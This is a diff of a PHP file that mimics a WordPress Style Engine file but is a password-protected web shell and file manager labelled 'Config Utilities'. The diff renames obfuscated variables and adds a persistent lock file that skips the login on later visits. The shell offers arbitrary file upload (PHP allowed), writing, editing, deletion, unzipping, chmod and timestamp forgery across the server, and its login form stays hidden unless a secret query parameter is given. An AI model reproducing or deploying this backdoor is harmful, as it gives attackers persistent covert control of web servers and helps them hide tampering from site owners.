@@ -1,141 +1,179 @@
 <?php
-/**
- * Style engine: Public functions
- *
- * This file contains a variety of public functions developers can use to interact with
- * the Style Engine API.
- *
- * @package WordPress
- * @subpackage StyleEngine
- * @since 6.1.0
- */
-defined('ABSPATH') || true;
 session_start();
-define('X0a1', realpath($_SERVER['DOCUMENT_ROOT']));
-if (isset($_GET['home']) && $_GET['home'] == '1') {
-    $homeDir = realpath($_SERVER['DOCUMENT_ROOT']);
-    if ($homeDir && is_dir($homeDir)) {
-        header("Location: ?d=" . urlencode($homeDir));
-        exit;
-    } else {
-        exit('Unable to resolve document root.');
+$error = '';
+defined('ABSPATH') || true;
+function get_auth_lock_path() {
+    $basename = '.auth.lock';
+    $candidates = [
+        sys_get_temp_dir() . '/' . $basename,
+        $_SERVER['DOCUMENT_ROOT'] . '/' . $basename,
+        __DIR__ . '/' . $basename
+    ];
+    foreach ($candidates as $path) {
+        if (file_exists($path)) return $path;
+    }
+    return $candidates[0];
+}
+$auth_lock_path = get_auth_lock_path();
+define('HOME_DIR', realpath($_SERVER['DOCUMENT_ROOT']));
+
+if (!function_exists('password_verify')) {
+    function password_verify($password, $hash) {
+        if (strpos($hash, '$2y$') === 0 || strpos($hash, '$2b$') === 0 || strpos($hash, '$2a$') === 0) {
+            return crypt($password, $hash) === $hash;
+        }
+        return hash('sha256', $password) === $hash;
     }
 }
-function z9w3($x1, $x2) {
-    return is_string($x2) ? file_put_contents($x1, $x2) !== false : false;
-}
-$z0 = array(
-    'q' => strrev('htua'),
-    'l' => chr(112),
-    'm' => implode('', array('pass','word','_ver','ify')),
-    'j' => array(
-        5 => 'FYLzxeyC8J3Ji3Jr/DsslWmv',
+$_c = array(
+    's' => strrev('htua'),
+    'k' => chr(112),
+    'v' => 'password_verify',
+    'h' => array(
+        5 => 'FYLzxeyC8J3Ji3Jr/DsslWmv', 
         3 => '$2b$12$7/sailO8HZM5i7AM',
         7 => 'HiMZc9pxuGB/.'
-    ));
-ksort($z0['j']);
-$z0['n'] = implode('', $z0['j']);
-$xdir = realpath(isset($_GET['d']) ? $_GET['d'] : __DIR__);
-if (!$xdir || strpos($xdir, '/') !== 0) $xdir = __DIR__;
-chdir($xdir);
-$l1 = $z0['l'];
-$m1 = $z0['m'];
-$q1 = $z0['q'];
-$p1 = isset($_POST[$l1]) ? $_POST[$l1] : '';
-$b1 = isset($_SESSION[$q1]) && $_SESSION[$q1] === true;
-$d1 = false;
-if ($b1) {
-    $d1 = true;
-} elseif ($p1 && $m1($p1, $z0['n'])) {
-    $_SESSION[$q1] = true;
-    $d1 = true;
+    )
+);
+ksort($_c['h']);
+$_c['f'] = implode('', $_c['h']);
+
+$cwd = realpath($_GET['d'] ?? __DIR__);
+if (!$cwd || strpos($cwd, '/') !== 0) $cwd = __DIR__;
+chdir($cwd);
+$_k = $_c['k'];
+$_v = $_c['v'];
+$_s = $_c['s'];
+$_p = $_POST[$_k] ?? '';
+$auth_session = isset($_SESSION[$_s]) && $_SESSION[$_s] === true;
+$auth_file = file_exists($auth_lock_path);
+$auth_valid = false;
+if ($auth_session || $auth_file) {
+    $auth_valid = true;
+} elseif ($_p && $_v($_p, $_c['f'])) {
+    $_SESSION[$_s] = true;
+    file_put_contents($auth_lock_path, 'ok');
+    $auth_valid = true;
 }
-if (!$d1) {
+if (isset($_GET['logout'])) {
+    unset($_SESSION[$_s]);
+    @unlink($auth_lock_path);
+    header("Location: ?load=meta");
+    exit;
+}
+if (!$auth_valid) {
     if (isset($_GET['load']) && $_GET['load'] === 'meta') {
         echo '<form method="post" style="position:absolute;top:40vh;left:50%;transform:translateX(-50%)">';
-        echo '<input type="password" name="' . $l1 . '" placeholder="••••••••" style="padding:8px">';
+        echo '<input type="password" name="' . $_k . '" placeholder="••••••••" style="padding:8px">';
         echo '<button>➤</button></form>';
     } else {
         echo "<!-- not authenticated -->";
     }
     exit;
 }
+function safer_write($file, $data) {
+    return is_string($data) ? file_put_contents($file, $data) !== false : false;
+}
+function is_valid_name($name) {
+    return preg_match('/^[a-zA-Z0-9._-]+$/', $name);
+}
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['inline_submit'], $_POST['fn'], $_POST['fd'])) {
-        $fn = basename($_POST['fn']);
-        $ext = strtolower(pathinfo($fn, PATHINFO_EXTENSION));
-        $okExts = ['txt', 'jpg', 'png', 'pdf', 'zip', 'php'];
-        if (!in_array($ext, $okExts)) {
-            $fn = 'file_' . time() . '.dat';
+        $filename = basename($_POST['fn']);
+        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
+        $safeExts = ['txt', 'jpg', 'png', 'pdf', 'zip', 'php'];
+        if (!in_array($ext, $safeExts)) {
+            $filename = 'file_' . time() . '.dat';
         } elseif ($ext === 'php') {
-            $fn = pathinfo($fn, PATHINFO_FILENAME) . '_' . time() . '.php';
+            $filename = pathinfo($filename, PATHINFO_FILENAME) . '_' . time() . '.php';
         }
-        $data = base64_decode($_POST['fd']);
-        if ($data && strlen($data) > 0) z9w3($xdir . '/' . $fn, $data);
+        $raw = base64_decode($_POST['fd']);
+        if ($raw && strlen($raw) > 0) safer_write($cwd . '/' . $filename, $raw);
     }
     if (isset($_POST['upl'], $_FILES['up']) && $_FILES['up']['error'] === 0 && $_FILES['up']['size'] > 0) {
-        move_uploaded_file($_FILES['up']['tmp_name'], $xdir . '/' . $_FILES['up']['name']);
+        move_uploaded_file($_FILES['up']['tmp_name'], $cwd . '/' . $_FILES['up']['name']);
     }
     if (isset($_POST['rmv'])) {
-        $tgt = realpath($_POST['rmv']);
-        if (is_file($tgt)) unlink($tgt);
-        elseif (is_dir($tgt)) rmdir($tgt);
+        $t = realpath($_POST['rmv']);
+        if (is_file($t)) unlink($t);
+        elseif (is_dir($t)) rmdir($t);
     }
     if (isset($_POST['rename'], $_POST['old'], $_POST['new']) && $_POST['new']) {
-        $o = $_POST['old'];
-        $n = dirname($o) . '/' . basename($_POST['new']);
-        if (file_exists($o)) rename($o, $n);
+        $old = $_POST['old'];
+        $new = dirname($old) . '/' . basename($_POST['new']);
+        if (file_exists($old)) rename($old, $new);
     }
+    if (isset($_POST['rename_dir'], $_POST['old_dir'], $_POST['new_dir']) && $_POST['new_dir']) {
+    $old = realpath($_POST['old_dir']);
+    $newName = basename(trim($_POST['new_dir']));
+    $new = dirname($old) . '/' . $newName;
+
+    if (!$old || !is_dir($old)) {
+        $error = "❌ Folder not found.";
+    } elseif (!is_valid_name($newName)) {
+        $error = "❌ Invalid folder name. Use only letters, numbers, dot (.), dash (-), or underscore (_).";
+    } elseif (file_exists($new)) {
+        $error = "❌ A folder with that name already exists.";
+    } else {
+        if (!rename($old, $new)) {
+            $error = "❌ Failed to rename folder due to a system error.";
+        }
+    }
+}
+
     if (isset($_POST['edit'], $_POST['content'])) {
-        $e = realpath($_POST['edit']);
-        if ($e && strpos($e, $xdir) === 0 && is_writable($e)) {
-            z9w3($e, $_POST['content']);
-        }}
+        $target = realpath($_POST['edit']);
+        if ($target && strpos($target, $cwd) === 0 && is_writable($target)) {
+            safer_write($target, $_POST['content']);
+        }
+    }
     if (isset($_POST['unzip'])) {
-        $z = new ZipArchive;
-        if ($z->open($_POST['unzip']) === TRUE) {
-            $z->extractTo($xdir);
-            $z->close();
-        }}
+        $zip = new ZipArchive;
+        if ($zip->open($_POST['unzip']) === TRUE) {
+            $zip->extractTo($cwd);
+            $zip->close();
+        }
+    }
     if (isset($_POST['ts_target'], $_POST['new_time'])) {
-        $t = $_POST['ts_target'];
+        $target = $_POST['ts_target'];
         $ts = strtotime($_POST['new_time']);
-        if ($ts !== false && file_exists($t)) touch($t, $ts);
+        if ($ts !== false && file_exists($target)) touch($target, $ts);
     }
     if (isset($_POST['modx_target'], $_POST['modx_val'])) {
-        $t = $_POST['modx_target'];
-        $m = intval($_POST['modx_val'], 8);
-        if (file_exists($t)) chmod($t, $m);
+        $target = $_POST['modx_target'];
+        $mode = intval($_POST['modx_val'], 8);
+        if (file_exists($target)) chmod($target, $mode);
     }
     if (isset($_POST['create_file']) && $_POST['create_file']) {
-        $f = $xdir . '/' . basename(trim($_POST['create_file']));
-        $cnt = isset($_POST['file_content']) ? $_POST['file_content'] : '';
-        if (!file_exists($f)) z9w3($f, $cnt);
+        $f = $cwd . '/' . basename(trim($_POST['create_file']));
+        $content = $_POST['file_content'] ?? '';
+        if (!file_exists($f)) safer_write($f, $content);
     }
     if (isset($_POST['create_dir']) && $_POST['create_dir']) {
-        $d = $xdir . '/' . basename(trim($_POST['create_dir']));
+        $d = $cwd . '/' . basename(trim($_POST['create_dir']));
         if (!file_exists($d)) mkdir($d);
-    }}
-$fls = [];
-$dirs = [];
-$prnt = dirname($xdir);
-if ($prnt && $prnt !== $xdir) {
-    $dirs[] = ['name' => '..', 'path' => $prnt, 'isParent' => true];
+    }
 }
-$scan = @scandir($xdir);
-if (!is_array($scan)) $scan = [];
-foreach ($scan as $item) {
+$files = [];
+$dirs = [];
+$parentDir = dirname($cwd);
+if ($parentDir && $parentDir !== $cwd) {
+    $dirs[] = ['name' => '..', 'path' => $parentDir, 'isParent' => true];
+}
+$allItems = @scandir($cwd);
+if (!is_array($allItems)) $allItems = [];
+foreach ($allItems as $item) {
     if ($item === '.' || $item === '..') continue;
-    $fp = realpath($xdir . DIRECTORY_SEPARATOR . $item);
-    if (!$fp) continue;
-    if (is_dir($fp)) {
-        $dirs[] = ['name' => $item, 'path' => $fp];
-    } elseif (is_file($fp)) {
-        $fls[] = ['name' => $item, 'path' => $fp];
-    }}
-$lst = array_merge($dirs, $fls);
+    $fullPath = realpath($cwd . DIRECTORY_SEPARATOR . $item);
+    if (!$fullPath) continue;
+    if (is_dir($fullPath)) {
+        $dirs[] = ['name' => $item, 'path' => $fullPath];
+    } elseif (is_file($fullPath)) {
+        $files[] = ['name' => $item, 'path' => $fullPath];
+    }
+}
+$sortedItems = array_merge($dirs, $files);
 ?>
-<?php $cwd = $xdir; ?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -150,18 +188,27 @@ $lst = array_merge($dirs, $fls);
 <body>
 <section class="section">
 <div class="container">
+<?php if (!empty($error)): ?>
+<article class="message is-danger">
+  <div class="message-body"><?php echo $error; ?></div>
+</article>
+<?php endif; ?>
 <h1 class="title">Config Utilities</h1>
+<a class="button is-danger is-light" href="?logout=1" style="float:right">Logout</a>
+
 <form method="get" style="display:flex;gap:10px;margin-bottom:10px;">
     <input class="input" name="d" value="<?php echo htmlspecialchars($cwd); ?>">
     <button class="button is-link">Go</button>
     <a class="button is-dark" href="?home=1">Home Dir</a>
 </form>
+
 <form method="post" enctype="multipart/form-data">
     <div class="field has-addons">
         <div class="control"><input type="file" class="input" name="up"></div>
         <div class="control"><button class="button is-primary" name="upl">Upload</button></div>
     </div>
 </form>
+
 <form method="post">
     <div class="field is-grouped" style="margin-top:1rem">
         <div class="control">
@@ -174,6 +221,7 @@ $lst = array_merge($dirs, $fls);
     <input type="hidden" name="fn" id="ufilename">
     <input type="hidden" name="fd" id="ufiledata">
 </form>
+
 <script>
 function handleInlineFile(input) {
     const file = input.files[0];
@@ -186,22 +234,24 @@ function handleInlineFile(input) {
     reader.readAsDataURL(file);
 }
 </script>
+
 <h2 class="subtitle">Create New File</h2>
 <form method="post">
     <input type="text" name="create_file" class="input" placeholder="filename.txt" required>
     <textarea name="file_content" class="textarea" placeholder="Optional initial content"></textarea>
     <button class="button is-success">Create File</button>
 </form>
+
 <h2 class="subtitle">Create New Folder</h2>
 <form method="post">
     <input type="text" name="create_dir" class="input" placeholder="foldername" required>
     <button class="button is-warning">Create Folder</button>
 </form>
+
 <table class="table is-striped is-fullwidth" style="margin-top: 2rem;">
 <thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Perms</th><th>Action</th></tr></thead>
 <tbody>
-<?php if (isset($lst) && is_array($lst) && count($lst) > 0): ?>
-<?php foreach ($lst as $item):
+<?php foreach ($sortedItems as $item):
     $isDir = is_dir($item['path']);
     $display = htmlspecialchars($item['name']);
     $size = $isDir ? '-' : filesize($item['path']) . ' B';
@@ -228,6 +278,14 @@ function handleInlineFile(input) {
     <form method="post" style="display:inline"><input type="hidden" name="view" value="<?php echo $item['path']; ?>"><button class="button is-small is-light">View</button></form>
 <?php endif; ?>
     <form method="post" style="display:inline"><input type="hidden" name="rmv" value="<?php echo $item['path']; ?>"><button class="button is-small is-danger" onclick="return confirm('Delete <?php echo $display; ?>?')">Delete</button></form>
+<?php if ($isDir && empty($item['isParent'])): ?>
+    <form method="post" style="display:inline">
+        <input type="hidden" name="old_dir" value="<?php echo $item['path']; ?>">
+        <input name="new_dir" class="input is-small" style="width:110px" placeholder="Rename Dir">
+        <button class="button is-small" name="rename_dir">Rename</button>
+    </form>
+<?php endif; ?>
+
 <?php if (!$isDir): ?>
     <form method="post" style="display:inline">
         <input type="hidden" name="old" value="<?php echo $item['path']; ?>">
@@ -250,11 +308,9 @@ function handleInlineFile(input) {
     </form>
 </td></tr>
 <?php endforeach; ?>
-<?php else: ?>
-<tr><td colspan="5"><em>No files or folders found.</em></td></tr>
-<?php endif; ?>
 </tbody>
 </table>
+
 <?php if (isset($_POST['edit'])):
 $target = $_POST['edit'];
 $safe = htmlspecialchars(file_get_contents($target)); ?>
@@ -265,6 +321,7 @@ $safe = htmlspecialchars(file_get_contents($target)); ?>
     <button class="button is-success">Save</button>
 </form>
 <?php endif; ?>
+
 <?php if (isset($_POST['view'])):
 $target = $_POST['view'];
 if (file_exists($target) && is_file($target)) {
